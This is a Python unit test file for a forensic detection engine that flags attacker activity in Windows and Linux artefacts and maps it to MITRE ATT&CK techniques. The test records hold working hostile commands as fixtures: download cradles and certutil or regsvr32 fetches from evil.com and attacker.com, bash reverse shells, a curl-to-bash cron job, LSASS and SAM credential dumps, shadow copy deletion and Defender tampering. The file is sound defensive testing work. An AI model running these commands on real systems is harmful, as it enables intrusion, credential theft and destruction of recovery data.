"""Unit tests for proprietary detection rules and detection engine."""

from __future__ import annotations

import io

from waeaa_ingestor.detection.engine import DetectionEngine
from waeaa_ingestor.detection.models import Severity
from waeaa_ingestor.detection.rules import (
    AccessibilityBackdoorRule,
    BcdeditRecoveryDisabledRule,
    BloodHoundReconRule,
    CertutilDownloadRule,
    CredentialDumpingRule,
    DefenderTamperingRule,
    ExecutionFromTempRule,
    LinuxCronSuspiciousRule,
    LinuxReverseShellRule,
    LinuxShadowAccessRule,
    LogClearingRule,
    LOLBinsExecutionRule,
    LsassMemoryDumpRule,
    MshtaExecutionRule,
    PowerShellDownloadCradleRule,
    PowerShellSuspiciousRule,
    RegistryRunPersistenceRule,
    Regsvr32ScrobjRule,
    SamHiveExportRule,
    ShadowCopyDeletionRule,
    SuspiciousServiceRule,
    SuspiciousUsbInsertionRule,
    WerExploitCrashRule,
    get_default_detection_rules,
)
from waeaa_ingestor.parsers.base import ParsedRecord


def test_log_clearing_rule() -> None:
    rule = LogClearingRule()
    rec = ParsedRecord(
        artefact_type="EventLog",
        source_file="System.evtx",
        timestamp_utc="2026-10-22T08:00:00Z",
        action="AuditLogCleared",
        summary="Event 1102: Audit log was cleared",
        details={"event_id": 1102},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL
    assert finding.mitre is not None
    assert finding.mitre.technique_id == "T1070.001"


def test_suspicious_service_rule() -> None:
    rule = SuspiciousServiceRule()
    rec = ParsedRecord(
        artefact_type="EventLog",
        source_file="System.evtx",
        timestamp_utc="2026-10-22T08:05:00Z",
        action="ServiceInstalled",
        summary="Service Installed: BackdoorSvc",
        details={
            "event_id": 7045,
            "service_name": "BackdoorSvc",
            "image_path": r"powershell.exe -enc AAAA== C:\Temp\run.ps1",
        },
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH
    assert finding.mitre is not None
    assert finding.mitre.technique_id == "T1543.003"


def test_powershell_suspicious_rule() -> None:
    rule = PowerShellSuspiciousRule()
    rec = ParsedRecord(
        artefact_type="EventLog",
        source_file="Microsoft-Windows-PowerShell%4Operational.evtx",
        timestamp_utc="2026-10-22T08:10:00Z",
        action="ScriptBlockExecution",
        summary="PowerShell executed script block",
        details={
            "event_id": 4104,
            "script_text": "IEX ((New-Object Net.WebClient).DownloadString('http://attacker.com/p.ps1'))",
        },
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH
    assert finding.mitre is not None
    assert finding.mitre.technique_id == "T1059.001"


def test_shadow_copy_deletion_rule() -> None:
    rule = ShadowCopyDeletionRule()
    rec = ParsedRecord(
        artefact_type="ShellHistory",
        source_file="console.log",
        timestamp_utc="2026-10-22T08:15:00Z",
        action="ShellCommand",
        summary="Command executed",
        details={"command": "vssadmin.exe delete shadows /all /quiet"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL
    assert finding.mitre is not None
    assert finding.mitre.technique_id == "T1490"


def test_credential_dumping_rule() -> None:
    rule = CredentialDumpingRule()
    rec = ParsedRecord(
        artefact_type="EventLog",
        source_file="Security.evtx",
        timestamp_utc="2026-10-22T08:20:00Z",
        action="ProcessCreation",
        summary="procdump.exe executed",
        details={"command": "procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL
    assert finding.mitre is not None
    assert finding.mitre.technique_id == "T1003.001"


def test_lolbins_execution_rule() -> None:
    rule = LOLBinsExecutionRule()
    rec = ParsedRecord(
        artefact_type="ShellHistory",
        source_file="cmd_history.txt",
        timestamp_utc="2026-10-22T08:25:00Z",
        action="ShellCommand",
        summary="certutil download",
        details={
            "command": "certutil.exe -urlcache -split -f http://evil.com/beacon.exe C:\\beacon.exe"
        },
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH
    assert finding.mitre is not None
    assert finding.mitre.technique_id == "T1218"


def test_execution_from_temp_rule() -> None:
    rule = ExecutionFromTempRule()
    rec = ParsedRecord(
        artefact_type="Prefetch",
        source_file="MALWARE-ABCD.pf",
        timestamp_utc="2026-10-22T08:30:00Z",
        action="Executed",
        summary="MALWARE executed from \\AppData\\Local\\Temp\\malware.exe",
        details={"target_path": r"C:\Users\Analyst\AppData\Local\Temp\malware.exe"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.MEDIUM


def test_registry_run_persistence_rule() -> None:
    rule = RegistryRunPersistenceRule()
    rec = ParsedRecord(
        artefact_type="RegistryRunKey",
        source_file="NTUSER.DAT",
        timestamp_utc="2026-10-22T08:35:00Z",
        action="RunKeyDetected",
        summary="Run Key: Updater -> powershell.exe -w hidden C:\\Temp\\sync.ps1",
        details={
            "value_name": "Updater",
            "value_data": r"powershell.exe -w hidden C:\Temp\sync.ps1",
        },
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH


def test_linux_shadow_access_rule() -> None:
    rule = LinuxShadowAccessRule()
    rec = ParsedRecord(
        artefact_type="ShellHistory",
        source_file="/home/dev/.bash_history",
        timestamp_utc="2026-10-22T08:40:00Z",
        action="ShellCommand",
        summary="[dev] cat /etc/shadow",
        details={"command": "cat /etc/shadow"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH


def test_linux_reverse_shell_rule() -> None:
    rule = LinuxReverseShellRule()
    rec = ParsedRecord(
        artefact_type="ShellHistory",
        source_file="/root/.bash_history",
        timestamp_utc="2026-10-22T08:45:00Z",
        action="ShellCommand",
        summary="[root] bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
        details={"command": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL


def test_linux_cron_suspicious_rule() -> None:
    rule = LinuxCronSuspiciousRule()
    rec = ParsedRecord(
        artefact_type="CronJob",
        source_file="/etc/crontab",
        timestamp_utc="2026-10-22T08:50:00Z",
        action="CronJob",
        summary="Cron Job [root]: curl -s http://evil.com/setup.sh | bash (* * * * *)",
        details={"command": "curl -s http://evil.com/setup.sh | bash"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH


def test_detection_engine_analyze_and_export() -> None:
    engine = DetectionEngine()
    records = [
        ParsedRecord(
            artefact_type="EventLog",
            source_file="System.evtx",
            timestamp_utc="2026-10-22T09:00:00Z",
            action="AuditLogCleared",
            summary="Audit log was cleared",
            details={"event_id": 1102},
        ),
        ParsedRecord(
            artefact_type="ShellHistory",
            source_file="/root/.bash_history",
            timestamp_utc="2026-10-22T09:01:00Z",
            action="ShellCommand",
            summary="[root] bash -i >& /dev/tcp/10.0.0.1/9999 0>&1",
            details={"command": "bash -i >& /dev/tcp/10.0.0.1/9999 0>&1"},
        ),
    ]

    findings = engine.analyze(records)
    assert len(findings) == 2

    # Severity counts
    counts = engine.get_severity_counts(findings)
    assert counts["Critical"] == 2

    # MITRE summary
    mitre_sum = engine.get_mitre_summary(findings)
    assert "Defense Evasion" in mitre_sum
    assert "Execution" in mitre_sum

    # Export JSON
    json_buf = io.StringIO()
    engine.write_json(findings, json_buf)
    assert "T1070.001" in json_buf.getvalue()

    # Export CSV
    csv_buf = io.StringIO()
    engine.write_csv(findings, csv_buf)
    assert "T1059.004" in csv_buf.getvalue()


def test_lsass_memory_dump_rule() -> None:
    rule = LsassMemoryDumpRule()
    rec = ParsedRecord(
        artefact_type="PowerShellHistory",
        source_file="ConsoleHost_history.txt",
        timestamp_utc="2026-10-22T09:10:00Z",
        action="CommandExecution",
        summary="rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump 672 C:\\temp\\lsass.dmp full",
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL
    assert finding.mitre.technique_id == "T1003.001"


def test_sam_hive_export_rule() -> None:
    rule = SamHiveExportRule()
    rec = ParsedRecord(
        artefact_type="ProcessExecution",
        source_file="Security.evtx",
        timestamp_utc="2026-10-22T09:12:00Z",
        action="ProcessCreated",
        summary="reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save",
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH
    assert finding.mitre.technique_id == "T1003.002"


def test_defender_tampering_rule() -> None:
    rule = DefenderTamperingRule()
    rec = ParsedRecord(
        artefact_type="PowerShellHistory",
        source_file="ConsoleHost_history.txt",
        timestamp_utc="2026-10-22T09:15:00Z",
        action="CommandExecution",
        summary="Set-MpPreference -DisableRealtimeMonitoring $true",
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL


def test_accessibility_backdoor_rule() -> None:
    rule = AccessibilityBackdoorRule()
    rec = ParsedRecord(
        artefact_type="RegistryHive",
        source_file="SOFTWARE",
        timestamp_utc="2026-10-22T09:20:00Z",
        action="RegistryKeyModified",
        summary=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe [Debugger=cmd.exe]",
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL
    assert finding.mitre.technique_id == "T1546.008"


def test_mshta_execution_rule() -> None:
    rule = MshtaExecutionRule()
    rec = ParsedRecord(
        artefact_type="Prefetch",
        source_file="MSHTA.EXE-1234.pf",
        timestamp_utc="2026-10-22T09:25:00Z",
        action="ProcessExecution",
        summary="mshta.exe javascript:alert('pwn')",
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.mitre.technique_id == "T1218.005"


def test_certutil_download_rule() -> None:
    rule = CertutilDownloadRule()
    rec = ParsedRecord(
        artefact_type="ProcessExecution",
        source_file="Security.evtx",
        timestamp_utc="2026-10-22T09:30:00Z",
        action="ProcessCreated",
        summary="certutil.exe -urlcache -split -f http://evil.com/beacon.exe beacon.exe",
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.mitre.technique_id == "T1105"


def test_regsvr32_scrobj_rule() -> None:
    rule = Regsvr32ScrobjRule()
    rec = ParsedRecord(
        artefact_type="ProcessExecution",
        source_file="Security.evtx",
        timestamp_utc="2026-10-22T09:35:00Z",
        action="ProcessCreated",
        summary="regsvr32.exe /s /u /i:http://evil.com/script.sct scrobj.dll",
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL


def test_powershell_download_cradle_rule() -> None:
    rule = PowerShellDownloadCradleRule()
    rec = ParsedRecord(
        artefact_type="PowerShellHistory",
        source_file="ConsoleHost_history.txt",
        timestamp_utc="2026-10-22T09:40:00Z",
        action="CommandExecution",
        summary="IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')",
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL


def test_bloodhound_recon_rule() -> None:
    rule = BloodHoundReconRule()
    rec = ParsedRecord(
        artefact_type="ProcessExecution",
        source_file="Security.evtx",
        timestamp_utc="2026-10-22T09:45:00Z",
        action="ProcessCreated",
        summary="SharpHound.exe -c All,DCOnly --domain corp.local",
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL


def test_bcdedit_recovery_rule() -> None:
    rule = BcdeditRecoveryDisabledRule()
    rec = ParsedRecord(
        artefact_type="ProcessExecution",
        source_file="Security.evtx",
        timestamp_utc="2026-10-22T09:50:00Z",
        action="ProcessCreated",
        summary="bcdedit.exe /set {default} recoveryenabled No",
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL


def test_usb_device_inserted_rule() -> None:
    rule = SuspiciousUsbInsertionRule()
    rec = ParsedRecord(
        artefact_type="USBDevice",
        source_file="setupapi.dev.log",
        timestamp_utc="2026-10-22T09:55:00Z",
        action="USB_DEVICE_INSTALL",
        summary="USB Device Installed: VID_0781 PID_5583",
        details={"vendor_id": "0781", "product_id": "5583"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.mitre.technique_id == "T1052.001"


def test_wer_exploit_crash_rule() -> None:
    rule = WerExploitCrashRule()
    rec = ParsedRecord(
        artefact_type="wer_crash",
        source_file="Report.wer",
        timestamp_utc="2026-10-22T09:58:00Z",
        action="PROCESS_CRASH",
        summary="Application crash detected: lsass.exe",
        process_name="lsass.exe",
        details={"exception_code": "c0000005"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH


def test_remote_access_and_appdata_rules() -> None:
    from waeaa_ingestor.detection.rules import (
        AppDataBinaryStagedRule,
        AppDataSuspiciousScriptRule,
        RemoteAccessAnyDeskRule,
        RemoteAccessAteraRule,
    )

    # AnyDesk rule
    r_anydesk = RemoteAccessAnyDeskRule()
    rec_anydesk = ParsedRecord(
        artefact_type="RemoteAccess",
        source_file="connection_trace.txt",
        timestamp_utc="2024-03-12T10:15:33Z",
        action="AnyDeskIncomingSession",
        summary="AnyDesk Incoming Session: ID 987654321 from 198.51.100.25",
        user="local_admin",
        details={"remote_anydesk_id": "987654321", "endpoint": "198.51.100.25:49152"},
    )
    f_anydesk = r_anydesk.evaluate(rec_anydesk)
    assert f_anydesk is not None
    assert f_anydesk.severity == Severity.HIGH
    assert f_anydesk.mitre is not None
    assert f_anydesk.mitre.technique_id == "T1219"

    # Atera rule
    r_atera = RemoteAccessAteraRule()
    rec_atera = ParsedRecord(
        artefact_type="RemoteAccess",
        source_file="AteraAgent.log",
        timestamp_utc="2024-03-12T12:00:00Z",
        action="AteraAgentActivity",
        summary="Atera RMM Agent Event: Running script C:\\ProgramData\\script.ps1 via PowerShell",
        details={"software": "Atera"},
    )
    f_atera = r_atera.evaluate(rec_atera)
    assert f_atera is not None
    assert f_atera.severity == Severity.HIGH
    assert f_atera.mitre is not None
    assert f_atera.mitre.technique_id == "T1219"

    # AppData suspicious script
    r_script = AppDataSuspiciousScriptRule()
    rec_script = ParsedRecord(
        artefact_type="AppDataStaging",
        source_file=r"AppData\Local\Temp\stage.bat",
        timestamp_utc="",
        action="SuspiciousScriptStaged",
        summary="Staged .BAT script with shadow copy deletion",
        details={"matched_threat_indicators": ["Shadow Copy Deletion / Ransomware"]},
    )
    f_script = r_script.evaluate(rec_script)
    assert f_script is not None
    assert f_script.severity == Severity.HIGH
    assert f_script.mitre is not None
    assert f_script.mitre.technique_id == "T1059"

    # AppData binary staged
    r_bin = AppDataBinaryStagedRule()
    rec_bin = ParsedRecord(
        artefact_type="AppDataStaging",
        source_file=r"AppData\Roaming\agent.exe",
        timestamp_utc="",
        action="BinaryStagedInAppData",
        summary="Staged PE Binary 'agent.exe'",
        details={"file_size": 1024, "is_valid_pe": True},
    )
    f_bin = r_bin.evaluate(rec_bin)
    assert f_bin is not None
    assert f_bin.severity == Severity.MEDIUM
    assert f_bin.mitre is not None
    assert f_bin.mitre.technique_id == "T1204.002"


def test_default_detection_rules_count() -> None:
    rules = get_default_detection_rules()
    assert len(rules) >= 45

